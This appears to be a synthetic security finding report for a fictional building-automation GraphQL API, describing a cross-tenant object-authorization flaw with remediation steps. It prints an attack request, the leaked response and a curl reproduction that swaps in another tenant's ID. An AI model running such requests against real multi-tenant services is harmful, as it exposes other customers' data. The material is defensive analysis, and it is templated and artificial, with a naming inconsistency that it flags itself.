# Security Analysis Report
**System:** NeoBuild BAS Platform
**Domain:** Smart Home / Building Automation
**Example ID:** GQL-0293
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.8 | Predictable/sequential ID enumeration via `listResources` — attacker from `tenant-feb6` reads building automation records owned by `tenant-b2f6` |

---

## Finding 1 — BOLA: Predictable/Sequential ID Enumeration (Pattern 1.8)

### Summary
The `listResources` resolver on NeoBuild BAS Platform (`api.neobuild-bas-platfor.example.com`) accepts a client-supplied `tenantId` filter argument without validating it against the JWT's `tenantId` claim. Per §5.0 Pattern 1.8, predictable or sequential IDs combined with absent ownership checks enable systematic object enumeration. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR request uses `listResources(tenantId: "tenant-b2f6")` but the response JSON key is `getResource`. These names conflict. The HAR (§6.0) request is the primary evidence.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-feb6b2f6"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 1.8 — Predictable or sequential IDs (BOLA)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.neobuild-bas-platfor.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-feb6`, supplying victim `tenantId: "tenant-b2f6"`)**
```
POST https://api.neobuild-bas-platfor.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-feb6

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-b2f6\") { resourceId ownerId data { sensitiveField } } }"}
```

**Response — Cross-Tenant Building Automation Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-b2f6",
      "ownerId": "other-user-feb6b2f6",
      "data": {
        "sensitiveField": "CONFIDENTIAL-feb6b2f6",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-feb6b2f6` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.neobuild-bas-platfor.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-feb6" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-b2f6\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-b2f6 returned for tenant-feb6 caller
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. `listResources` must ignore client-supplied `tenantId`; extract from JWT only.
2. Use UUIDs or opaque IDs to prevent sequential enumeration.
3. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
